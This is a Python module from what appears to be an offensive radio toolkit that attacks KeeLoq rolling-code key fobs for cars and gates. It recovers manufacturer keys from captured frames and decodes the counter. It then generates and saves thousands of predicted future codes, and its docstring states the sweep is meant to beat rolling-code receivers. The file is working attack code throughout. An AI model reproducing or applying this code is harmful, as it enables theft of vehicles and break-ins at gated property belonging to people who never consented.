"""Fob hop analysis: identify, decode, counter prediction and sweep.

Everything here works on a parsed ``SubFile`` or on a raw 64-bit frame, so it
runs without hardware. Transmission is a separate step (see ``car.modules``).
"""

from __future__ import annotations

import os

from omni.car import vehicles
from omni.core import config
from omni.rf import keeloq_crypto as kq
from omni.rf.keeloq_tx import clone_next_subs
from omni.rf.keystore import Keystore, KeySearcher, manufacturer_key, resolve_man
from omni.rf.protocols.keeloq import next_counter

__all__ = ["load_keystore", "identify", "analyze_sub", "analyze_frame",
           "sweep", "write_subs", "counter_chain", "verdict",
           "manufacturer_for", "resolve"]

VERDICT_FIXED = "fixed-code: replay directly"
VERDICT_HOPPING_KNOWN = "hopping, manufacturer key found: predict next codes"
VERDICT_HOPPING_UNKNOWN = "hopping, manufacturer key unknown: replay only"


def load_keystore(path: str | None = None) -> Keystore:
    """Load the KeeLoq manufacturer DB (config default when path is None)."""
    store = Keystore()
    target = path or str(config.get_value("car.keeloq_keys", "") or "")
    if not target:
        return store
    candidates = [os.path.expanduser(target)]
    if not os.path.isabs(target):
        repo = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        candidates.append(os.path.join(os.path.dirname(repo), target))
    for candidate in candidates:
        if os.path.exists(candidate):
            store.load(candidate)
            break
    return store


def identify(freq: int) -> dict:
    """Candidate vehicle/gate profiles for a carrier frequency."""
    return {"freq": int(freq),
            "candidates": [p.to_row() for p in vehicles.for_frequency(freq)]}


def verdict(coding: str, mf_known: bool) -> str:
    if coding in ("fixed", "ble"):
        return VERDICT_FIXED
    return VERDICT_HOPPING_KNOWN if mf_known else VERDICT_HOPPING_UNKNOWN


def analyze_frame(fix: int, hop: int, keystore: Keystore | None = None) -> dict:
    """Split a frame and try every manufacturer key against it."""
    btn, serial = kq.parse_fix(fix)
    out: dict = {"fix": f"0x{fix & kq.MASK32:08X}",
                 "hop": f"0x{hop & kq.MASK32:08X}",
                 "button": btn, "serial": f"0x{serial:07X}",
                 "counter": None, "manufacturer": None, "seed": 0}
    if keystore is None or len(keystore) == 0:
        out["verdict"] = verdict("hopping", False)
        return out
    finder = KeySearcher(keystore)
    try:
        hit = finder.find(fix & kq.MASK32, hop & kq.MASK32, 0)
    finally:
        finder.close()
    if hit is None:
        out["verdict"] = verdict("hopping", False)
        return out
    name, counter, seed = hit
    out.update({"manufacturer": name, "counter": counter, "seed": seed,
                "verdict": verdict("hopping", True)})
    return out


def analyze_sub(sub, keystore: Keystore | None = None,
                brand_list: list[str] | None = None) -> dict:
    """Full analysis of a captured .sub (decoded or raw)."""
    base: dict = {"frequency": sub.frequency,
                  "preset": getattr(sub, "preset_name", ""),
                  "protocol": sub.protocol, "raw": sub.is_raw,
                  "brands": brand_list or []}
    base["profiles"] = [{"brand": b,
                         "profiles": [p.to_row() for p in vehicles.by_brand(b)]}
                        for b in (brand_list or [])]
    if sub.is_raw or not sub.key:
        base["verdict"] = "raw capture: replay as-is (no counter maths)"
        base["samples"] = len(sub.raw_data)
        return base
    fix, hop = kq.split_frame(sub.key)
    base.update(analyze_frame(fix, hop, keystore))
    if brand_list:
        base["verdict"] = (f"{base.get('verdict', '')} — brand hint "
                           f"{', '.join(brand_list)}")
    return base


def sweep(sub, keystore: Keystore | None = None, start: int | None = None,
          count: int | None = None, step: int = 1, mode: int | None = None):
    """Generate ``count`` future frames from the captured counter.

    ``step`` > 1 skips ahead (receivers accept forward jumps); leaving
    ``start`` unset resumes from the decoded counter, which is what makes the
    sweep usable against a rolling-code receiver.
    """
    count = int(count if count is not None else
                config.get_value("car.sweep_window", 4096))
    if not sub.manufacture and keystore is not None and len(keystore):
        found = analyze_frame(*kq.split_frame(sub.key), keystore=keystore)
        if found.get("manufacturer"):
            sub.manufacture = found["manufacturer"]
            sub.seed = int(found.get("seed") or 0)
    step = max(1, int(step))
    if step > 1:
        clones, counters = clone_next_subs(sub, keystore, steps=count * step,
                                          counter_mode=mode, start_cnt=start)
        picked_c = counters[step - 1::step]
        picked_s = clones[step - 1::step]
        return picked_s[:count], picked_c[:count]
    return clone_next_subs(sub, keystore, steps=count, counter_mode=mode,
                           start_cnt=start)


def write_subs(subs: list, outdir: str | None = None,
               prefix: str = "sweep") -> list[str]:
    """Persist generated frames as .sub files; returns written paths."""
    outdir = outdir or config.output_dir("car/sweep")
    os.makedirs(outdir, exist_ok=True)
    paths = []
    for i, sub in enumerate(subs):
        path = os.path.join(outdir, f"{prefix}_{i:05d}.sub")
        sub.save(path)
        paths.append(path)
    return paths


def counter_chain(fix: int, hop: int, man_key: int, count: int = 4,
                  mode: int = 2) -> list[dict]:
    """Encrypt the next ``count`` counters with a known manufacturer key."""
    from omni.rf.util import reverse_key
    btn, serial = kq.parse_fix(fix)
    _b, _s, cnt = kq.parse_decrypt(kq.keeloq_decrypt(hop & kq.MASK32, man_key))
    rows = []
    for _ in range(max(0, count)):
        cnt = next_counter(cnt, mode)
        word = ((btn & 0xF) << 28) | ((serial & 0x3FF) << 16) | (cnt & 0xFFFF)
        enc = kq.keeloq_encrypt(word, man_key)
        rows.append({"counter": cnt, "hop": f"0x{enc:08X}",
                     "wire": f"0x{reverse_key(enc, 32):08X}"})
    return rows


def manufacturer_for(serial: int, seed: int, keystore: Keystore,
                     name: str) -> int | None:
    """Derive the manufacturer key of one keystore entry for a serial."""
    entry = keystore.get(name)
    return None if entry is None else manufacturer_key(entry, serial, seed)


def resolve(entry_name: str, fix: int, hop: int, seed: int,
            keystore: Keystore):
    """(manufacturer key, decoded counter) for an explicit entry name."""
    entry = keystore.get(entry_name)
    if entry is None:
        return None, None
    man, dec = resolve_man(entry, fix, hop, seed)
    return man, None if dec is None else dec & 0xFFFF

